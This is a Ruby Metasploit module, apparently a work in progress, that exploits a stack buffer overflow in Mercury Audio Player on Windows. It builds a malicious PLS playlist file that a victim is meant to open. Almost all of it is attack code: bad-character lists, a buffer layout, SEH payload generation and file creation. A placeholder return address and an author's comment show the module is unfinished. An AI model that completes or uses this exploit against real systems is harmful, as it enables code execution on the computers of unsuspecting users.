# for seh, i think i need to find an address that points to a ret
# function within mercury.
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Mercury Audio Player(PLS File) Stack Overflow.',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in the Mercury Audio Player.
					An attacker must send the file to victim and the victim must open the file.
					Alternatively it may be possible to execute code remotely via an embedded
					PLS file within a browser, when the PLS extention is registered to Mercury.
					This functionality has not been tested in this module.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'dougsko' ],
			'Version'        => '0.0.1',
			'References'     =>
				[
					[ 'URL', 'http://www.milw0rm.com/exploits/8582' ],
				],
			'Payload'        =>
				{
					#'Space'    => 800,
                    'BadChars' => "\x00\x0a\x0d\x3c\x22\x3e\x3d",
					#'EncoderType'   => Msf::Encoder::Type::AlphanumMixed,
                    #'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'        => 
				[
					[ 'Default', { 'Ret' => 0xDEADBEEF,
                                   'BufSize' => 120, #120,
                                 } 
                    ], 
				],
			'Privileged'     => false,
			'DisclosureDate' => '30 Apr 2009',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME', [ false, 'The file name.',  'exploit_mercury.pls']),
					OptString.new('OUTPUTPATH', [ false, 'The location of the file.',  './']),
				], self.class)

	end

    # [124 garbage] [return address] [500 nop] [payload] [500 garbage]
    # [124] [4] [120]
	def exploit
        seh = generate_seh_payload(target.ret)
        filepls = "[playlist]\n"
        filepls += "NumberOfEntries=1\n\n"
        filepls += "File1=" 
        filepls += "A" * target['BufSize']
        #filepls += [target.ret].pack('V') + payload.encoded + "C" * 1000
        filepls += seh + rand_text_alpha_upper(1000) #payload.encoded + "C" * 1000

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(filepls)
	end

end

